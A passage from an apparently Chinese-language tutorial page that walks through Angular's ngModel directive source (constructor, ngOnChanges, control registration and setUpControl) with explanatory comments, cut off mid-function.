</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br></div></div><h3 id="ngmodel详解"><a href="#ngmodel详解" class="header-anchor">#</a> ngModel详解</h3> <p>指令输入与输出属性</p> <div class="language-typescript line-numbers-mode"><pre class="language-typescript"><code>@<span class="token function">Input</span><span class="token punctuation">(</span><span class="token punctuation">)</span> name<span class="token operator">:</span> <span class="token builtin">string</span><span class="token punctuation">;</span>
@<span class="token function">Input</span><span class="token punctuation">(</span><span class="token string">'disabled'</span><span class="token punctuation">)</span> isDisabled<span class="token operator">:</span> <span class="token builtin">boolean</span><span class="token punctuation">;</span>
@<span class="token function">Input</span><span class="token punctuation">(</span><span class="token string">'ngModel'</span><span class="token punctuation">)</span> model<span class="token operator">:</span> <span class="token builtin">any</span><span class="token punctuation">;</span>
@<span class="token function">Input</span><span class="token punctuation">(</span><span class="token string">'ngModelOptions'</span><span class="token punctuation">)</span> options<span class="token operator">:</span> <span class="token punctuation">{</span>name<span class="token operator">?</span><span class="token operator">:</span> <span class="token builtin">string</span><span class="token punctuation">,</span> standalone<span class="token operator">?</span><span class="token operator">:</span> <span class="token builtin">boolean</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><p>输出属性</p> <div class="language-typescript line-numbers-mode"><pre class="language-typescript"><code>@<span class="token function">Output</span><span class="token punctuation">(</span><span class="token string">'ngModelChange'</span><span class="token punctuation">)</span> update <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">EventEmitter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>NgModel 类</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token comment">// angular2/packages/forms/src/directives/ng_model.ts</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">NgModel</span> <span class="token keyword">extends</span> <span class="token class-name">NgControl</span> <span class="token keyword">implements</span> <span class="token class-name">OnChanges</span><span class="token punctuation">,</span>
    OnDestroy <span class="token punctuation">{</span>
  <span class="token comment">/** @internal */</span>
  _control <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FormControl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 创建FormControl对象</span>
  <span class="token comment">/** @internal */</span>
  _registered <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span> <span class="token comment">// 用于标识控件是否已注册</span>
  viewModel<span class="token operator">:</span> any<span class="token punctuation">;</span> <span class="token comment">// 用于保存前一次model的值</span>
  <span class="token operator">...</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br></div></div><p>NgModel 构造函数</p> <div class="language-typescript line-numbers-mode"><pre class="language-typescript"><code><span class="token keyword">constructor</span><span class="token punctuation">(</span>
  <span class="token parameter">@<span class="token function">Optional</span><span class="token punctuation">(</span><span class="token punctuation">)</span> @<span class="token function">Host</span><span class="token punctuation">(</span><span class="token punctuation">)</span> parent<span class="token operator">:</span> ControlContainer<span class="token punctuation">,</span>
  @<span class="token function">Optional</span><span class="token punctuation">(</span><span class="token punctuation">)</span> @<span class="token function">Self</span><span class="token punctuation">(</span><span class="token punctuation">)</span> @<span class="token function">Inject</span><span class="token punctuation">(</span><span class="token constant">NG_VALIDATORS</span><span class="token punctuation">)</span> validators<span class="token operator">:</span> <span class="token builtin">Array</span><span class="token operator">&lt;</span>Validator<span class="token operator">|</span>ValidatorFn<span class="token operator">&gt;</span><span class="token punctuation">,</span>
  @<span class="token function">Optional</span><span class="token punctuation">(</span><span class="token punctuation">)</span> @<span class="token function">Self</span><span class="token punctuation">(</span><span class="token punctuation">)</span> @<span class="token function">Inject</span><span class="token punctuation">(</span><span class="token constant">NG_ASYNC_VALIDATORS</span><span class="token punctuation">)</span> asyncValidators<span class="token operator">:</span>     
     <span class="token builtin">Array</span><span class="token operator">&lt;</span>AsyncValidator<span class="token operator">|</span>AsyncValidatorFn<span class="token operator">&gt;</span><span class="token punctuation">,</span>
  @<span class="token function">Optional</span><span class="token punctuation">(</span><span class="token punctuation">)</span> @<span class="token function">Self</span><span class="token punctuation">(</span><span class="token punctuation">)</span> @<span class="token function">Inject</span><span class="token punctuation">(</span><span class="token constant">NG_VALUE_ACCESSOR</span><span class="token punctuation">)</span>
     valueAccessors<span class="token operator">:</span> ControlValueAccessor<span class="token punctuation">[</span><span class="token punctuation">]</span></span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
         <span class="token keyword">super</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
         <span class="token keyword">this</span><span class="token punctuation">.</span>_parent <span class="token operator">=</span> parent<span class="token punctuation">;</span>
         <span class="token keyword">this</span><span class="token punctuation">.</span>_rawValidators <span class="token operator">=</span> validators <span class="token operator">||</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
         <span class="token keyword">this</span><span class="token punctuation">.</span>_rawAsyncValidators <span class="token operator">=</span> asyncValidators <span class="token operator">||</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
         <span class="token keyword">this</span><span class="token punctuation">.</span>valueAccessor <span class="token operator">=</span> <span class="token function">selectValueAccessor</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span> valueAccessors<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token comment">// @Optional() - 表示该依赖对象是可选的</span>
<span class="token comment">// @Host() - 表示从宿主元素注入器获取依赖对象</span>
<span class="token comment">// @Self() - 表示从当前注入器获取依赖对象</span>
<span class="token comment">// @Inject() - 用于注入 Token (new InjectionToken) 对应的非 Type 类型依赖对象</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br></div></div><p>构造函数执行的操作：</p> <ul><li>获取 ControlContainer (控件容器)对象</li> <li>获取控件上的同步验证器</li> <li>获取控件上的异步验证器</li> <li>获取控件上的 ControlValueAccessor</li></ul> <p>NgModel 生命周期钩子</p> <div class="language-typescript line-numbers-mode"><pre class="language-typescript"><code><span class="token function">ngOnChanges</span><span class="token punctuation">(</span><span class="token parameter">changes<span class="token operator">:</span> SimpleChanges</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">_checkForErrors</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">this</span><span class="token punctuation">.</span>_registered<span class="token punctuation">)</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">_setUpControl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">'isDisabled'</span> <span class="token keyword">in</span> changes<span class="token punctuation">)</span> <span class="token punctuation">{</span>
       <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">_updateDisabled</span><span class="token punctuation">(</span>changes<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isPropertyUpdated</span><span class="token punctuation">(</span>changes<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>viewModel<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">_updateValue</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>model<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>viewModel <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>model<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br></div></div><p>_checkForErrors()</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">private</span> <span class="token function">_checkForErrors</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token keyword">void</span> <span class="token punctuation">{</span>
   <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">_isStandalone</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">_checkParentType</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
   <span class="token punctuation">}</span>
   <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">_checkName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token comment">// 判断是否设置standalone属性</span>
<span class="token keyword">private</span> <span class="token function">_isStandalone</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span> boolean <span class="token punctuation">{</span> 
   <span class="token keyword">return</span> <span class="token operator">!</span><span class="token keyword">this</span><span class="token punctuation">.</span>_parent <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>options <span class="token operator">&amp;&amp;</span> <span class="token keyword">this</span><span class="token punctuation">.</span>options<span class="token punctuation">.</span>standalone<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token comment">/**
 * 1.ngModel指令不能与formGroupName或formArrayName指令一起使用，需改用   
 * formControlName或调整ngModel的父控件使用的指令为ngModelGroup。
 *
 * 2.ngModel不能被注册到使用formGroup指令的表单中，需改用formControlName或设置  
 * ngModelOptions对象中的standalone属性，避免注册该控件。
 */</span>
<span class="token keyword">private</span> <span class="token function">_checkParentType</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token keyword">void</span> <span class="token punctuation">{</span>
   <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>_parent <span class="token keyword">instanceof</span> <span class="token class-name">NgModelGroup</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span>
      <span class="token keyword">this</span><span class="token punctuation">.</span>_parent <span class="token keyword">instanceof</span> <span class="token class-name">AbstractFormGroupDirective</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
         TemplateDrivenErrors<span class="token punctuation">.</span><span class="token function">formGroupNameException</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
   <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>_parent <span class="token keyword">instanceof</span> <span class="token class-name">NgModelGroup</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> 
      <span class="token operator">!</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>_parent <span class="token keyword">instanceof</span> <span class="token class-name">NgForm</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
         TemplateDrivenErrors<span class="token punctuation">.</span><span class="token function">modelParentException</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
   <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token comment">/**
 * 验证是否设置name属性
 * 
 * 如果在表单标签中使用 ngModel，则必须设置 name 属性，或者在ngModelOptions中必须将
 * 表单控件定义为&quot;standalone&quot;。
 *
 * &lt;input [(ngModel)]=&quot;person.firstName&quot; [ngModelOptions]=&quot;{standalone: 
 *    true}&quot;&gt;
 */</span>
<span class="token keyword">private</span> <span class="token function">_checkName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token keyword">void</span> <span class="token punctuation">{</span>
   <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>options <span class="token operator">&amp;&amp;</span> <span class="token keyword">this</span><span class="token punctuation">.</span>options<span class="token punctuation">.</span>name<span class="token punctuation">)</span> <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>options<span class="token punctuation">.</span>name<span class="token punctuation">;</span>
   <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">_isStandalone</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token keyword">this</span><span class="token punctuation">.</span>name<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            TemplateDrivenErrors<span class="token punctuation">.</span><span class="token function">missingNameException</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
   <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br></div></div><p>_setUpControl()</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token comment">// 初始化控件</span>
<span class="token keyword">private</span> <span class="token function">_setUpControl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token keyword">void</span> <span class="token punctuation">{</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">_isStandalone</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">_setUpStandalone</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">:</span>
          <span class="token comment">// 在ControlContainer所属的form中注册该控件</span>
          <span class="token keyword">this</span><span class="token punctuation">.</span>formDirective<span class="token punctuation">.</span><span class="token function">addControl</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
    <span class="token keyword">this</span><span class="token punctuation">.</span>_registered <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span> <span class="token comment">// 标识已注册</span>
<span class="token punctuation">}</span>

<span class="token comment">// 若设置standalone属性，则初始化该控件，并更新控件的值和验证状态</span>
<span class="token keyword">private</span> <span class="token function">_setUpStandalone</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token keyword">void</span> <span class="token punctuation">{</span>
   <span class="token function">setUpControl</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>_control<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
   <span class="token keyword">this</span><span class="token punctuation">.</span>_control<span class="token punctuation">.</span><span class="token function">updateValueAndValidity</span><span class="token punctuation">(</span><span class="token punctuation">{</span>emitEvent<span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token comment">// 获取ControlContainer所属的form</span>
<span class="token keyword">get</span> <span class="token function">formDirective</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span> any <span class="token punctuation">{</span> 
  <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>_parent <span class="token operator">?</span> <span class="token keyword">this</span><span class="token punctuation">.</span>_parent<span class="token punctuation">.</span>formDirective <span class="token operator">:</span> <span class="token keyword">null</span><span class="token punctuation">;</span> 
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br></div></div><ul><li>addControl</li></ul> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token function">addControl</span><span class="token punctuation">(</span>dir<span class="token operator">:</span> NgModel<span class="token punctuation">)</span><span class="token operator">:</span> <span class="token keyword">void</span> <span class="token punctuation">{</span>
  resolvedPromise<span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
  <span class="token keyword">const</span> container <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">_findContainer</span><span class="token punctuation">(</span>dir<span class="token punctuation">.</span>path<span class="token punctuation">)</span><span class="token punctuation">;</span>
  dir<span class="token punctuation">.</span>_control <span class="token operator">=</span> <span class="token operator">&lt;</span>FormControl<span class="token operator">&gt;</span>container<span class="token punctuation">.</span><span class="token function">registerControl</span><span class="token punctuation">(</span>dir<span class="token punctuation">.</span>name<span class="token punctuation">,</span> dir<span class="token punctuation">.</span>control<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">setUpControl</span><span class="token punctuation">(</span>dir<span class="token punctuation">.</span>control<span class="token punctuation">,</span> dir<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 调用时机点二</span>
  dir<span class="token punctuation">.</span>control<span class="token punctuation">.</span><span class="token function">updateValueAndValidity</span><span class="token punctuation">(</span><span class="token punctuation">{</span>emitEvent<span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br></div></div><ul><li>setUpControl()</li></ul> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token comment">// angular2/packages/forms/src/directives/shared.ts</span>
<span class="token keyword">export</span> <span class="token keyword">function</span> <span class="token function">setUpControl</span><span class="token punctuation">(</span><span class="token parameter">control<span class="token operator">:</span> FormControl<span class="token punctuation">,</span> dir<span class="token operator">:</span> NgControl</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token keyword">void</span> <span class="token punctuation">{</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>control<span class="token punctuation">)</span> <span class="token function">_throwError</span><span class="token punctuation">(</span>dir<span class="token punctuation">,</span> <span class="token string">'Cannot find control with'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token comment">/**
   * NgModel构造函数
   * @Optional() @Self() @Inject(NG_VALUE_ACCESSOR) valueAccessors: ControlValueAccessor[]
   * this.valueAccessor = selectValueAccessor(this, valueAccessors);
   */</span>
  <span class="token comment">// 判断控件是否实现ControlValueAccessor接口</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>dir<span class="token punctuation">.</span>valueAccessor<span class="token punctuation">)</span> <span class="token function">_throwError</span><span class="token punctuation">(</span>dir<span class="token punctuation">,</span> <span class="token string">'No value accessor for form control with'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token comment">// 组合同步验证器</span>
  control<span class="token punctuation">.</span>validator <span class="token operator">=</span> Validators<span class="token punctuation">.</span><span class="token function">compose</span><span class="token punctuation">(</span><span class="token punctuation">[</span>control<span class="token punctuation">.</span>validator<span class="token punctuation">,</span> dir<span class="token punctuation">.</span>validator<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token comment">// 组合异步验证器</span>
  control<span class="token punctuation">.</span>asyncValidator <span class="token operator">=</span> Validators<span class="token punctuation">.</span><span class="token function">composeAsync</span><span class="token punctuation">(</span><span class="token punctuation">[</span>control<span class="token punctuation">.</span>asyncValidator<span class="token punctuation">,</span> 
      dir<span class="token punctuation">.</span>asyncValidator<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token comment">// 该方法用于将模型中的新值写入视图或 DOM 属性中</span>
  dir<span class="token punctuation">.</span>valueAccessor<span class="token punctuation">.</span><span class="token function">writeValue</span><span class="token punctuation">(</span>control<span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token comment">// view -&gt; model</span>
  <span class="token comment">/**
   * @Directive({
   *    selector: 'input:not([type=checkbox])[formControlName],...',
   *    host: {
   *     '(input)': '_handleInput($event.target.value)'
   *    },
   *    providers: [DEFAULT_VALUE_ACCESSOR]
   *  })
   * export class DefaultValueAccessor implements ControlValueAccessor {
   *    // 下面就是调用该方法
   *      registerOnChange(fn: (_: any) =&gt; void): void { this.onChange = fn; }
   *     
   *    // input事件触发后，调用该方法
   *      _handleInput(value: any): void {
   *       if (!this._compositionMode || (this._compositionMode &amp;&amp; !this._composing)) {
   *            this.onChange(value); //调用下面注册的onChange函数
   *      }
   *    }
   * }
   *
   */</span>
  dir<span class="token punctuation">.</span>valueAccessor<span class="token punctuation">.</span><span class="token function">registerOnChange</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">newValue<span class="token operator">:</span> any</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
    <span class="token comment">/**
     * ngModel指令 - viewToModelUpdate() 方法
     * 
     * viewToModelUpdate(newValue: any): void {
     *    this.viewModel = newValue; // 更新viewModel
     * // @Output('ngModelChange') update = new EventEmitter();
     *    this.update.emit(newValue); // 触发ngModelChange事件
     * }
     */</span>
    dir<span class="token punctuation">.</span><span class="token function">viewToModelUpdate</span><span class="token punctuation">(</span>newValue<span class="token punctuation">)</span><span class="token punctuation">;</span>
    control<span class="token punctuation">.</span><span class="token function">markAsDirty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">/*
    * setValue(value: any, {onlySelf, emitEvent, emitModelToViewChange, 
    *       emitViewToModelChange}: {
    *    onlySelf?: boolean,
    *    emitEvent?: boolean,
    *      emitModelToViewChange?: boolean,
    *      emitViewToModelChange?: boolean
    * } = {}): void {
    *      this._value = value;
    *      if (this._onChange.length &amp;&amp; emitModelToViewChange !== false) {
    *          this._onChange.forEach((changeFn) =&gt; changeFn(this._value,     
    *           emitViewToModelChange !== false));
    *     }
    *    this.updateValueAndValidity({onlySelf, emitEvent});
    * }
    */</span>
    control<span class="token punctuation">.</span><span class="token function">setValue</span><span class="token punctuation">(</span>newValue<span class="token punctuation">,</span> <span class="token punctuation">{</span>emitModelToViewChange<span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 更新控件的值</span>
  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token comment">// touched</span>
  dir<span class="token punctuation">.</span>valueAccessor<span class="token punctuation">.</span><span class="token function">registerOnTouched</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> control<span class="token punctuation">.</span><span class="token function">markAsTouched</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token comment">/**
   * control = new FormControl();
   * 
   * control - _onChange 属性
   * _onChange: Function[] = []; 
   *
   * control - registerOnChange() 方法  
   * registerOnChange(fn: Function): void { this._onChange.push(fn); }
  */</span>
  control<span class="token punctuation">.</span><span class="token function">registerOnChange</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">newValue<span class="token operator">:</span> any<span class="token punctuation">,</span> emitModelEvent<span class="token operator">:</span> boolean</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
    <span class="token comment">// control -&gt; view</span>
    <span class="token comment">/*
    * writeValue(value: any): void {
    *   const normalizedValue = value == null ? '' : value;
    *   this._renderer.setElementProperty(this._elementRef.nativeElement, 'value', 
    *       normalizedValue);
    * }
    */</span>
    dir<span class="token punctuation">.</span>valueAccessor<span class="token punctuation">.</span><span class="token function">writeValue</span><span class="token punctuation">(</span>newValue<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">// control -&gt; ngModel</span>
    <span class="token comment">/**
     * ngModel指令 - viewToModelUpdate() 方法
     * 
     * viewToModelUpdate(newValue: any): void {
     *    this.viewModel = newValue; // 更新viewModel
     * // @Output('ngModelChange') update = new EventEmitter();
     *    this.update.emit(newValue); // 触发ngModelChange事件
     * }
     */</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>emitModelEvent<span class="token punctuation">)</span> dir<span class="token punctuation">.</span><span class="token function">viewToModelUpdate</span><span class="token punctuation">(</span>newValue<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token comment">// 当控件状态变成 DISABLED 或从 DISABLED 状态变化成 ENABLE 状态时，会调用该函数。该函数会根据参数  </span>
  <span class="token comment">// 值，启用或禁用指定的 DOM 元素</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>dir<span class="token punctuation">.</span>valueAccessor<span class="token punctuation">.</span>setDisabledState<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    control<span class="token punctuation">.</span><span class="token function">registerOnDisabledChange</span><span class="token punctuation">(</span>
        <span class="token punctuation">(</span><span class="token parameter">isDisabled<span class="token operator">:</span> boolean</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span> dir<span class="token punctuation">.</span>valueAccessor<span class="token punctuation">.</span><span class="token function">setDisabledState</span><span class="token punctuation">(</span>isDisabled<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token comment">// re-run validation when validator binding changes, e.g. minlength=3 -&gt; minlength=4</span>
  dir<span class="token punctuation">.</span>_rawValidators<span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">validator<span class="token operator">:</span> Validator <span class="token operator">|</span> ValidatorFn</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">&lt;</span>Validator<span class="token operator">&gt;</span>validator<span class="token punctuation">)</span><span class="token punctuation">.</span>registerOnValidatorChange<span class="token punctuation">)</span>
